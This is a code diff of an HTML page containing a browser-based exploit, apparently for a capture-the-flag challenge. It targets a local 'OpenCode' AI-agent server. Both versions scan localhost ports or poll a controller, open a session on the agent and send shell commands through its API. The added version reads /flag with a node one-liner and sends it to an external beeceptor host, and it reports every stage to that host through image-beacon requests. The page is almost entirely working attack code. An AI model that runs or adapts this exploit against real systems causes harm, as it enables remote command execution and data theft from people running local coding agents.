@@ -1,90 +1,140 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head><title>OpenCode Exploit (Probe + Official API)</title></head>
 <body>
-<h1>Exploiting...</h1>
 <script>
-// 你的接收服务器（确保 nc -lvn 2222 或 python -m http.server 2222）
-const EXFIL = "https://1233333.free.beeceptor.com/?log=";
-
-function log(msg, data) {
-    let text = msg + (data ? ": " + JSON.stringify(data).slice(0, 300) : "");
-    console.log(text);
-    new Image().src = EXFIL + encodeURIComponent(text);
-}
-
-// 常见端口（可自行增减）
-const PORTS = [4096, 8080, 3000, 5000, 7681, 8888, 9000];
-const HEALTH_PATH = "/global/health";
-
-// 探测端口是否存活（GET /global/health）
-async function probePort(port) {
-    try {
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 3000);
-        const res = await fetch(`http://127.0.0.1:${port}${HEALTH_PATH}`, { signal: controller.signal });
-        clearTimeout(timeout);
-        if (res.ok) {
-            const text = await res.text();
-            log(`[Port ${port}] Health check OK: ${text.slice(0, 100)}`);
-            return true;
-        }
-    } catch (e) {
-        // 忽略错误
-    }
-    return false;
-}
-
-// 通过官方 API 执行命令
-async function execCommand(port, command) {
-    const base = `http://127.0.0.1:${port}`;
-    try {
-        // 1. 创建 session
-        const sessionRes = await fetch(`${base}/session`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: '{}'
-        });
-        if (!sessionRes.ok) throw new Error(`Session HTTP ${sessionRes.status}`);
-        const session = await sessionRes.json();
-        const sessionId = session.id;
-        log(`[Port ${port}] Session created: ${sessionId}`);
-
-        // 2. 通过 shell 接口执行命令
-        const shellRes = await fetch(`${base}/session/${sessionId}/shell`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ agent: "build", command: command })
-        });
-        if (!shellRes.ok) throw new Error(`Shell HTTP ${shellRes.status}`);
-        const output = await shellRes.json(); // 假设返回执行结果
-        log(`[Port ${port}] Command output:`, output);
-        if (JSON.stringify(output).includes("flag{")) {
-            log(`[FLAG] ${JSON.stringify(output)}`);
-        }
-        return true;
-    } catch (err) {
-        log(`[Port ${port}] Error: ${err.message}`);
-        return false;
-    }
-}
-
-// 主流程
 (async () => {
-    log("Starting exploit: probe ports then official API");
-    let foundPort = null;
-    for (let port of PORTS) {
-        if (await probePort(port)) {
-            foundPort = port;
-            break;
-        }
+  const EXFIL = 'https://1233333.free.beeceptor.com';
+  const RUN = Math.random().toString(36).slice(2) + Date.now();
+  const CTRL = 'http://127.0.0.1:4096';
+
+  function log(stage, extra = '') {
+    const u =
+      `${EXFIL}/log?run=${encodeURIComponent(RUN)}` +
+      `&stage=${encodeURIComponent(stage)}` +
+      (extra ? `&${extra}` : '');
+    new Image().src = u;
+  }
+
+  async function jfetch(url, opt = {}, timeout = 2000) {
+    const c = new AbortController();
+    const t = setTimeout(() => c.abort(), timeout);
+    try {
+      const r = await fetch(url, { signal: c.signal, cache: 'no-store', ...opt });
+      const txt = await r.text();
+      let json = null;
+      try { json = JSON.parse(txt); } catch (_) {}
+      return { r, txt, json };
+    } finally {
+      clearTimeout(t);
     }
-    if (foundPort) {
-        log(`Found OpenCode at port ${foundPort}, sending commands`);
-        await execCommand(foundPort, "chmod 644 /flag && cat /flag");
-    } else {
-        log("No OpenCode service found on common ports");
+  }
+
+  log('loaded');
+
+  try {
+    const h = await jfetch(`${CTRL}/healthz`, {}, 1200);
+    log('ctrl-health', `code=${h.r.status}&body=${encodeURIComponent(h.txt.slice(0,120))}`);
+  } catch (e) {
+    log('ctrl-health-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
+    return;
+  }
+
+  try {
+    const s = await jfetch(`${CTRL}/api/instance/start`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}'
+    }, 2000);
+    log('start-posted', `code=${s.r.status}&body=${encodeURIComponent(s.txt.slice(0,160))}`);
+  } catch (e) {
+    log('start-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
+    return;
+  }
+
+  let ip = null, port = null, statusBody = null;
+  for (let i = 0; i < 20; i++) {
+    try {
+      const st = await jfetch(`${CTRL}/api/status`, {}, 1500);
+      statusBody = st.json || {};
+      log('status-poll', `i=${i}&body=${encodeURIComponent(st.txt.slice(0,200))}`);
+
+      if (statusBody.instance && statusBody.instance.ip && statusBody.instance.port) {
+        ip = statusBody.instance.ip;
+        port = statusBody.instance.port;
+        break;
+      }
+    } catch (e) {
+      log('status-fail', `i=${i}&err=${encodeURIComponent(String(e).slice(0,120))}`);
     }
+    await new Promise(r => setTimeout(r, 800));
+  }
+
+  if (!ip || !port) {
+    log('no-instance');
+    return;
+  }
+
+  const BASE = `http://${ip}:${port}`;
+  log('instance-found', `ip=${encodeURIComponent(ip)}&port=${port}`);
+
+  try {
+    const gh = await jfetch(`${BASE}/global/health`, {}, 1500);
+    log('oc-health', `code=${gh.r.status}&body=${encodeURIComponent(gh.txt.slice(0,120))}`);
+  } catch (e) {
+    log('oc-health-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
+    return;
+  }
+
+  let agent = 'build';
+  try {
+    const ar = await jfetch(`${BASE}/agent`, {}, 1500);
+    if (Array.isArray(ar.json) && ar.json.length) {
+      agent = ar.json.find(x => x.id === 'build')?.id || ar.json[0].id || 'build';
+    }
+    log('agent-ok', `agent=${encodeURIComponent(agent)}&body=${encodeURIComponent(ar.txt.slice(0,120))}`);
+  } catch (e) {
+    log('agent-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
+  }
+
+  let sid = null;
+  try {
+    const sr = await jfetch(`${BASE}/session`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}'
+    }, 2000);
+
+    sid = sr.json && sr.json.id;
+    log('session-ok', `sid=${encodeURIComponent(String(sid))}&body=${encodeURIComponent(sr.txt.slice(0,160))}`);
+  } catch (e) {
+    log('session-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
+    return;
+  }
+
+  if (!sid) {
+    log('no-sid');
+    return;
+  }
+
+  const cmd =
+    `node -e "const fs=require('fs'),https=require('https');` +
+    `fs.chmodSync('/flag',0o644);` +
+    `https.get('${EXFIL}/flag?run=${RUN}&f='+encodeURIComponent(fs.readFileSync('/flag','utf8')))"`;
+
+  try {
+    const sh = await jfetch(`${BASE}/session/${sid}/shell`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        agent,
+        command: cmd
+      })
+    }, 3000);
+
+    log('shell-posted', `code=${sh.r.status}&body=${encodeURIComponent(sh.txt.slice(0,200))}`);
+  } catch (e) {
+    log('shell-fail', `err=${encodeURIComponent(String(e).slice(0,120))}`);
+  }
 })();
 </script>
 </body>
